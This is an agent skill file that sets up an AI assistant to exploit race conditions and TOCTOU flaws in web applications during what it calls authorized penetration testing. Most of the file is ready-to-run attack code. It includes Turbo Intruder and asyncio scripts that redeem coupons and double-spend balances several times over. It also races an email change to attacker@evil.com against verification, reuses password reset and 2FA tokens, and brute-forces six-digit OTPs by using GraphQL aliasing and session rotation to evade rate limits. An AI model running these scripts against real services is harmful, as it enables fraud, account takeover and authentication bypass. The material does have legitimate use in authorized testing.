---
name: race-condition
description: >
  Exploit race conditions and TOCTOU vulnerabilities in web applications
  during authorized penetration testing.
keywords:
  - race condition
  - TOCTOU
  - limit overrun
  - double spend
  - single-packet attack
  - HTTP/2 race
  - turbo intruder race
  - concurrent requests
  - parallel requests exploit
  - coupon reuse
  - rate limit race
  - last-byte sync
tools:
  - burpsuite (Turbo Intruder)
  - python3
  - httpx
  - ffuf
opsec: medium
---

# Race Condition Exploitation

You are helping a penetration tester exploit race conditions and TOCTOU
vulnerabilities in web applications. Race conditions occur when an application
processes concurrent requests without proper locking, allowing attackers to
violate business logic constraints (e.g., redeem a coupon twice, overdraw a
balance, bypass rate limits). All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[race-condition] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Target URL with authenticated session (most races require auth)
- Burp Suite with Turbo Intruder extension (primary tool)
- Python 3 with `httpx` and `asyncio` (alternative to Turbo Intruder)
- HTTP/2 support on target (for single-packet attack — check with `curl --http2`)
- Identified state-changing endpoint (payment, coupon, transfer, vote, etc.)

## Step 1: Identify Race-Susceptible Endpoints

Look for endpoints where the server:
1. **Checks a constraint then acts** — balance check → debit, coupon validity → apply
2. **Has a limit** — one coupon per user, one vote per item, X transfers per day
3. **Performs multi-step operations** — read → validate → write (non-atomic)
4. **Uses external state** — database lookups without row-level locking

### High-Value Targets

| Endpoint Type | Race Goal | Impact |
|---|---|---|
| Coupon/promo code redemption | Redeem same code multiple times | Financial |
| Balance transfer/payment | Double-spend, overdraw balance | Financial |
| Gift card top-up/redemption | Duplicate credit | Financial |
| Like/vote/rating | Inflate counts past limit | Integrity |
| Invite code/referral | Reuse single-use token | Access |
| Account registration | Bypass unique email constraint | Account takeover |
| Password reset | Use same token in parallel | Account takeover |
| 2FA verification | Submit OTP to multiple sessions | Auth bypass |
| File upload quota | Exceed storage limits | Resource abuse |
| API rate limit | Bypass per-request throttling | Abuse amplification |

### Detect Race Window

```bash
# Check if HTTP/2 is supported (enables single-packet attack)
curl -sI --http2 https://TARGET/ -o /dev/null -w '%{http_version}\n'
# 2 = HTTP/2 supported

# Measure server processing time for the target endpoint
# Longer processing = wider race window
curl -s -o /dev/null -w '%{time_total}\n' \
  -X POST https://TARGET/api/redeem -d 'code=PROMO123' \
  -H "Cookie: session=SESSIONID"

# Check for idempotency headers (may prevent races)
curl -sI -X POST https://TARGET/api/transfer -d 'amount=100' \
  -H "Cookie: session=SESSIONID" | grep -i "idempotency"
```

## Step 2: HTTP/2 Single-Packet Attack

The most reliable synchronization technique. All requests arrive in a single TCP
packet, eliminating network jitter. Requires HTTP/2 support.

### Burp Suite — Repeater (Quick Test)

1. Send the target request to Repeater
2. Duplicate the tab 10-20 times (Ctrl+R)
3. Select all tabs → right-click → **Send group in parallel (single-packet attack)**
4. Compare responses for signs of race success (duplicate redemption, double debit)

### Turbo Intruder — Single-Packet with Gate

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)  # HTTP/2 engine

    # Queue N identical requests, all held at the gate
    for i in range(20):
        engine.queue(target.req, gate='race1')

    # Open gate — all requests sent in single packet
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Turbo Intruder — Multi-Endpoint Race

Race two different endpoints against each other (e.g., change email + send
verification simultaneously):

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Request 1: change email to attacker-controlled
    changeEmailReq = '''POST /api/email HTTP/2
Host: TARGET
Cookie: session=SESSIONID
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=attacker%40evil.com'''

    # Request 2: trigger verification for current email
    verifyReq = '''POST /api/verify-email HTTP/2
Host: TARGET
Cookie: session=SESSIONID
Content-Length: 0

'''

    # Alternate: one change, many verifications
    engine.queue(changeEmailReq, gate='race1')
    for i in range(19):
        engine.queue(verifyReq, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

## Step 3: HTTP/1.1 Last-Byte Synchronization

For targets without HTTP/2. Send all requests minus the final byte, then release
them simultaneously.

### Turbo Intruder — Last-Byte Sync

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=1,
                           pipeline=False)

    # Queue 30 requests — engine holds last byte of each
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # Release all final bytes simultaneously
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Python — asyncio + httpx

```python
import asyncio
import httpx

URL = "https://TARGET/api/redeem"
HEADERS = {"Cookie": "session=SESSIONID"}
DATA = {"code": "PROMO123"}

async def send_request(client, i):
    resp = await client.post(URL, headers=HEADERS, data=DATA)
    return f"[{i}] {resp.status_code} - {resp.text[:100]}"

async def main():
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        tasks = [send_request(client, i) for i in range(20)]
        results = await asyncio.gather(*tasks)
        for r in results:
            print(r)

asyncio.run(main())
```

### Connection Warming

Reduce variance by warming the connection before the race:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False)

    # Warm connections with a harmless GET
    for i in range(30):
        engine.queue('GET / HTTP/1.1\r\nHost: TARGET\r\n\r\n')

    # Now queue the real race requests
    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

## Step 4: Limit-Overrun Attacks

The most common race condition class. Exploit check-then-act patterns to exceed
a limit.

### Coupon / Promo Code Reuse

```
Target: POST /api/apply-coupon
Body: code=SAVE20
Expected: "Coupon already used" after first redemption

Race: Send 20 identical requests in single packet
Success: Multiple 200 OK responses, discount applied N times
Verify: Check order total or account balance for duplicate discounts
```

### Balance Transfer / Double-Spend

```
Target: POST /api/transfer
Body: to=RECIPIENT&amount=1000
Expected: "Insufficient funds" when balance < amount

Race: Send 10 transfers simultaneously when balance = 1000
Success: Multiple successful transfers totaling > original balance
Verify: Check sender and recipient balances
```

### Vote / Like / Rating Manipulation

```
Target: POST /api/vote
Body: item_id=123&vote=up
Expected: "Already voted" after first vote

Race: Send 50 votes in single packet
Success: Vote count increases by more than 1
Verify: Check item's total vote count
```

### Invite Code / Referral Reuse

```
Target: POST /api/invite/accept
Body: code=INVITE123
Expected: "Invite already used" after first acceptance

Race: Send 10 accepts from different sessions simultaneously
Success: Multiple accounts created from single invite
Verify: Check if multiple new accounts exist
```

## Step 5: Authentication & Session Races

### Password Reset Token Reuse

```python
# Race to use the same reset token in two parallel sessions
import asyncio, httpx

TOKEN = "abc123resettoken"
NEW_PASSWORDS = ["attacker_pass_1", "attacker_pass_2"]

async def reset(client, password):
    resp = await client.post("https://TARGET/reset", data={
        "token": TOKEN, "password": password
    })
    return f"{password}: {resp.status_code} {resp.text[:80]}"

async def main():
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        tasks = [reset(client, p) for p in NEW_PASSWORDS]
        results = await asyncio.gather(*tasks)
        for r in results:
            print(r)

asyncio.run(main())
```

### 2FA Code Reuse

```
Target: POST /api/verify-2fa
Body: code=123456
Expected: Code invalidated after single use

Race: Submit same OTP in two sessions simultaneously
Success: Both sessions authenticated
```

Turbo Intruder with different session cookies:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    sessions = ['session=AAAA', 'session=BBBB', 'session=CCCC']
    for s in sessions:
        req = target.req.replace('session=PLACEHOLDER', s)
        engine.queue(req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Registration Confirmation Race

```
Flow: Register → receive email → click confirmation link

Attack: Register two accounts, race to confirm with the same token
or: Submit confirmation request many times before it's invalidated

Target: GET /api/confirm?token=CONFIRM_TOKEN
Race: Send 20 confirmation requests in single packet
Goal: Token accepted multiple times, or confirmation applied to wrong account
```

### Email Change Verification Race

Race the email change and verification endpoints simultaneously — change the email
address while a verification for the old address is in flight:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    changeReq = '''POST /api/email/change HTTP/2
Host: TARGET
Cookie: session=SESSIONID
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

email=attacker@evil.com'''

    verifyReq = '''POST /api/email/verify HTTP/2
Host: TARGET
Cookie: session=SESSIONID
Content-Length: 0

'''

    # Send change once, verify many times
    engine.queue(changeReq, gate='race1')
    for i in range(19):
        engine.queue(verifyReq, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

## Step 6: Rate Limit Bypass via Races

### HTTP/2 Multiplexing

Send many requests on a single connection — server may count as one request for
rate limiting purposes:

```python
import asyncio, httpx

async def brute_otp(client, code):
    resp = await client.post("https://TARGET/api/verify", data={
        "code": str(code).zfill(6)
    }, headers={"Cookie": "session=SESSIONID"})
    return f"{code}: {resp.status_code}"

async def main():
    # HTTP/2 multiplexes all requests on single connection
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        for batch_start in range(0, 1000000, 100):
            tasks = [brute_otp(client, c) for c in range(batch_start, batch_start + 100)]
            results = await asyncio.gather(*tasks)
            for r in results:
                if "200" in r or "success" in r.lower():
                    print(f"[+] {r}")
                    return

asyncio.run(main())
```

### GraphQL Alias Batching

Send multiple operations in a single GraphQL request — one rate limit deduction,
many operations:

```graphql
mutation bruteForceOTP {
  a0: verifyCode(code: "000000") { success token }
  a1: verifyCode(code: "000001") { success token }
  a2: verifyCode(code: "000002") { success token }
  a3: verifyCode(code: "000003") { success token }
  a4: verifyCode(code: "000004") { success token }
  # ... generate up to 100+ aliases per request
}
```

Python to generate and send:

```python
import httpx

def build_alias_query(start, count):
    mutations = []
    for i in range(count):
        code = str(start + i).zfill(6)
        mutations.append(f'  a{i}: verifyCode(code: "{code}") {{ success token }}')
    return "mutation bruteForce {\n" + "\n".join(mutations) + "\n}"

client = httpx.Client(http2=True, verify=False)
for batch in range(0, 1000000, 100):
    query = build_alias_query(batch, 100)
    resp = client.post("https://TARGET/graphql",
        json={"query": query},
        headers={"Cookie": "session=SESSIONID"})
    data = resp.json().get("data", {})
    for key, val in data.items():
        if val and val.get("success"):
            print(f"[+] Code found at {key}: {val}")
            break
```

### Session Rotation

If rate limiting is per-session, rotate sessions between requests:

```python
import asyncio, httpx

SESSIONS = ["sess_aaaa", "sess_bbbb", "sess_cccc", "sess_dddd", "sess_eeee"]

async def try_code(client, code, session):
    resp = await client.post("https://TARGET/api/verify", data={
        "code": str(code).zfill(6)
    }, headers={"Cookie": f"session={session}"})
    return code, resp.status_code, resp.text[:60]

async def main():
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        for batch in range(0, 10000, len(SESSIONS)):
            tasks = [
                try_code(client, batch + i, SESSIONS[i % len(SESSIONS)])
                for i in range(len(SESSIONS))
            ]
            results = await asyncio.gather(*tasks)
            for code, status, body in results:
                if status == 200 and "invalid" not in body.lower():
                    print(f"[+] Valid: {code}")
                    return

asyncio.run(main())
```

## Step 7: Advanced Race Techniques

### Partial Construction Race (Multi-Step Operations)

Attack multi-step flows where the object is partially constructed between steps:

```
Example: User registration
  Step 1: POST /register → creates user with unverified email
  Step 2: GET /verify?token=X → marks email as verified

Race: During the window between steps 1 and 2, the user exists
      but isn't fully initialized. Access the partially-constructed
      account before verification completes.
```

### Race Window Expansion via Server-Side Delays

Trigger longer processing to widen the race window:

```
# If the endpoint processes uploaded files, send a large file
# to extend server-side processing time
POST /api/profile/update HTTP/2
Content-Type: multipart/form-data; boundary=----RACE

------RACE
Content-Disposition: form-data; name="avatar"
Content-Type: image/jpeg

[large JPEG data — 5MB+]
------RACE
Content-Disposition: form-data; name="coupon"

SAVE20
------RACE--
```

### Chain with Session Fixation

```
1. Obtain a valid pre-authentication session
2. Complete login → session upgraded to authenticated
3. Race: use the same session in parallel before server
   can invalidate the pre-auth session state
```

### Database-Level TOCTOU

```
# Common vulnerable pattern:
#   BEGIN TRANSACTION
#   SELECT balance FROM accounts WHERE id=1  -- check
#   -- [RACE WINDOW: another request reads same balance]
#   UPDATE accounts SET balance=balance-100 WHERE id=1  -- act
#   COMMIT

# Without SELECT ... FOR UPDATE or serializable isolation,
# concurrent transactions can both read the same balance
# and both succeed in debiting.
```

### WebSocket Race

```python
import asyncio
import websockets

async def race_ws():
    async with websockets.connect("wss://TARGET/ws",
            extra_headers={"Cookie": "session=SESSIONID"}) as ws:
        # Send many messages as fast as possible
        messages = ['{"action":"redeem","code":"PROMO123"}'] * 20
        await asyncio.gather(*[ws.send(m) for m in messages])

        # Collect all responses
        for _ in range(20):
            resp = await ws.recv()
            print(resp)

asyncio.run(race_ws())
```

## Step 8: Confirming Race Success

Race conditions often produce subtle effects. Verify with:

### Response Comparison

```
# Look for:
# - Multiple 200 OK where only one should succeed
# - Different response bodies (one success, others should be "already used")
# - All responses say "success" (definitive race win)
# - Response timing: near-identical timestamps = good synchronization
```

### State Verification

```bash
# After the race, check the resulting state:

# Balance check — was it debited more than once?
curl -s https://TARGET/api/balance -H "Cookie: session=SESSIONID" | jq .

# Coupon check — was the discount applied multiple times?
curl -s https://TARGET/api/cart -H "Cookie: session=SESSIONID" | jq .total

# Vote count — did it exceed the limit?
curl -s https://TARGET/api/items/123 -H "Cookie: session=SESSIONID" | jq .votes
```

### Iterate

Race conditions can be probabilistic. If initial attempts fail:

1. **Increase concurrency** — try 50-100 parallel requests
2. **Expand the race window** — add a slow operation to the same request
3. **Try different synchronization** — switch between HTTP/2 single-packet, last-byte sync, asyncio
4. **Warm connections** — send a harmless request first to establish connections
5. **Repeat the attempt** — some races succeed ~10% of the time, run 10-20 iterations
6. **Check for session locking** — some frameworks serialize per-session; use different sessions

### Session Locking Workaround

Some frameworks (PHP, ASP.NET) lock the session file, serializing requests per
session. Bypass by:

```
# Use different sessions for each parallel request
# Each session has its own lock, so they execute concurrently

# Or trigger a logout endpoint (doesn't lock) alongside the target
# to break the session lock chain
```

## Step 9: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## Troubleshooting

### Race Never Succeeds (All But One Request Rejected)

- **Session locking**: Framework serializes per-session → use different sessions for each request
- **Database locking**: SELECT ... FOR UPDATE or serializable isolation → race window may be too narrow
- **Idempotency keys**: Server tracks request IDs → ensure each request has a unique/missing idempotency key
- **WAF rate limiting**: Burst detected → reduce concurrency, add connection warming
- **Try different sync**: HTTP/2 single-packet → HTTP/1.1 last-byte → asyncio raw

### Inconsistent Results

- Race conditions are probabilistic — run 10-20 attempts
- Vary timing: try different numbers of concurrent requests (10, 20, 50, 100)
- Widen the race window: send a large payload alongside the race request
- Check if server uses message queues (async processing) — may need different approach

### HTTP/2 Not Available

- Fall back to HTTP/1.1 last-byte synchronization
- Use `concurrentConnections=30` with `pipeline=False` in Turbo Intruder
- asyncio with connection pooling is less precise but still effective

### Application Returns Errors Under Load

- Reduce concurrent requests — start with 5-10, increase gradually
- Add delays between batches: `engine.queue(target.req, gate='race1'); time.sleep(0.01)`
- Some applications crash under race conditions — this itself may be a finding (DoS)
- Check for connection limits or thread pool exhaustion
